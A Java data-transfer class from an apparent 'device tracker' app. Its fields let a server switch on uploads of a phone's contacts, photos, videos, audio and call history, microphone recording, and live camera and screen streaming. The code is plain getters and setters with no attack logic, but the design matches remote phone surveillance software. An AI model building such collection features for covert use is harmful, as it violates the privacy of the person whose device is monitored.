package com.example.devicetrackerapp.dto;

public class TrackingConfigResponse {

    private Boolean trackingEnabled;
    private Integer trackingInterval;

    // Contact Sync
    private Boolean contactsUploaded;
    private Boolean refreshContacts;

    // Images Sync
    private Boolean imagesUploaded;
    private Boolean refreshImages;

    private String imageBucketId;

    private Integer imageLimit;

    private Integer imageOffset;

    private String imageOrder;

    // Video Sync
    private Boolean refreshVideos;

    private Boolean videosUploaded;

    private String videoBucketId;

    private Integer videoLimit;

    private Integer videoOffset;

    private String videoOrder;

    //Audio
    private Boolean refreshAudios;
    private Boolean audiosUploaded;

    private String audioBucketId;

    private Integer audioLimit;

    private Integer audioOffset;

    private String audioOrder;

    //Mic Recording
    private Boolean refreshMic;
    private Boolean micUploaded;
    private Integer micDuration;

    //Camer
    private Boolean refreshCamera;
    private Boolean cameraStreaming;
    private String cameraType;

    //Screen
    private Boolean refreshScreen;
    private Boolean screenStreaming;
    private String screenStatus;
    private String screenSessionId;

    //call history
    private Boolean refreshCallHistory;

    public TrackingConfigResponse() {
    }

    public Boolean getTrackingEnabled() {
        return trackingEnabled;
    }

    public void setTrackingEnabled(Boolean trackingEnabled) {
        this.trackingEnabled = trackingEnabled;
    }

    public Integer getTrackingInterval() {
        return trackingInterval;
    }

    public void setTrackingInterval(Integer trackingInterval) {
        this.trackingInterval = trackingInterval;
    }

    public Boolean getRefreshCallHistory() {
        return refreshCallHistory;
    }

    public void setRefreshCallHistory(Boolean refreshCallHistory) {
        this.refreshCallHistory = refreshCallHistory;
    }

    public Boolean getContactsUploaded() {
        return contactsUploaded;
    }

    public void setContactsUploaded(Boolean contactsUploaded) {
        this.contactsUploaded = contactsUploaded;
    }

    public Boolean getRefreshContacts() {
        return refreshContacts;
    }

    public void setRefreshContacts(Boolean refreshContacts) {
        this.refreshContacts = refreshContacts;
    }

    public Boolean getImagesUploaded() {
        return imagesUploaded;
    }

    public void setImagesUploaded(Boolean imagesUploaded) {
        this.imagesUploaded = imagesUploaded;
    }

    public Boolean getRefreshImages() {
        return refreshImages;
    }

    public void setRefreshImages(Boolean refreshImages) {
        this.refreshImages = refreshImages;
    }

    public String getImageOrder() {return imageOrder;}

    public void setImageOrder(String imageOrder) {this.imageOrder = imageOrder;}

    public Boolean getRefreshVideos() {
        return refreshVideos;
    }

    public void setRefreshVideos(Boolean refreshVideos) {
        this.refreshVideos = refreshVideos;
    }

    public Boolean getVideosUploaded() {
        return videosUploaded;
    }

    public void setVideosUploaded(Boolean videosUploaded) {
        this.videosUploaded = videosUploaded;
    }

    public String getVideoBucketId() {
        return videoBucketId;
    }

    public void setVideoBucketId(String videoBucketId) {
        this.videoBucketId = videoBucketId;
    }

    public Integer getVideoLimit() {
        return videoLimit;
    }

    public void setVideoLimit(Integer videoLimit) {
        this.videoLimit = videoLimit;
    }

    public Integer getVideoOffset() {
        return videoOffset;
    }

    public void setVideoOffset(Integer videoOffset) {
        this.videoOffset = videoOffset;
    }

    public String getVideoOrder() {
        return videoOrder;
    }

    public void setVideoOrder(String videoOrder) {
        this.videoOrder = videoOrder;
    }
    public Boolean getRefreshAudios() {
        return refreshAudios;
    }

    public void setRefreshAudios(Boolean refreshAudios) {
        this.refreshAudios = refreshAudios;
    }

    public Boolean getAudiosUploaded() {
        return audiosUploaded;
    }

    public void setAudiosUploaded(Boolean audiosUploaded) {
        this.audiosUploaded = audiosUploaded;
    }

    public String getAudioBucketId() {
        return audioBucketId;
    }

    public void setAudioBucketId(String audioBucketId) {
        this.audioBucketId = audioBucketId;
    }

    public Integer getAudioLimit() {
        return audioLimit;
    }

    public void setAudioLimit(Integer audioLimit) {
        this.audioLimit = audioLimit;
    }

    public Integer getAudioOffset() {
        return audioOffset;
    }

    public void setAudioOffset(Integer audioOffset) {
        this.audioOffset = audioOffset;
    }

    public String getAudioOrder() {
        return audioOrder;
    }

    public void setAudioOrder(String audioOrder) {
        this.audioOrder = audioOrder;
    }

    // Mic Recording
    public Boolean getRefreshMic() {
        return refreshMic;
    }

    public void setRefreshMic(Boolean refreshMic) {
        this.refreshMic = refreshMic;
    }

    public Boolean getMicUploaded() {
        return micUploaded;
    }

    public void setMicUploaded(Boolean micUploaded) {
        this.micUploaded = micUploaded;
    }

    public Integer getMicDuration() {
        return micDuration;
    }

    public void setMicDuration(Integer micDuration) {
        this.micDuration = micDuration;
    }

    public Boolean getRefreshCamera() {
        return refreshCamera;
    }

    public void setRefreshCamera(Boolean refreshCamera) {
        this.refreshCamera = refreshCamera;
    }

    public Boolean getCameraStreaming() {
        return cameraStreaming;
    }

    public void setCameraStreaming(Boolean cameraStreaming) {
        this.cameraStreaming = cameraStreaming;
    }

    public String getImageBucketId() {
        return imageBucketId;
    }

    public void setImageBucketId(String imageBucketId) {
        this.imageBucketId = imageBucketId;
    }

    public Integer getImageLimit() {
        return imageLimit;
    }

    public void setImageLimit(Integer imageLimit) {
        this.imageLimit = imageLimit;
    }

    public Integer getImageOffset() {
        return imageOffset;
    }

    public void setImageOffset(Integer imageOffset) {
        this.imageOffset = imageOffset;
    }

    public String getCameraType() {return cameraType;}

    public void setCameraType(String cameraType) {this.cameraType = cameraType;}

    public Boolean getRefreshScreen() {
        return refreshScreen;
    }

    public void setRefreshScreen(Boolean refreshScreen) {
        this.refreshScreen = refreshScreen;
    }

    public Boolean getScreenStreaming() {
        return screenStreaming;
    }

    public void setScreenStreaming(Boolean screenStreaming) {
        this.screenStreaming = screenStreaming;
    }

    public String getScreenStatus() {
        return screenStatus;
    }

    public void setScreenStatus(String screenStatus) {
        this.screenStatus = screenStatus;
    }

    public String getScreenSessionId() {
        return screenSessionId;
    }

    public void setScreenSessionId(String screenSessionId) {
        this.screenSessionId = screenSessionId;
    }

}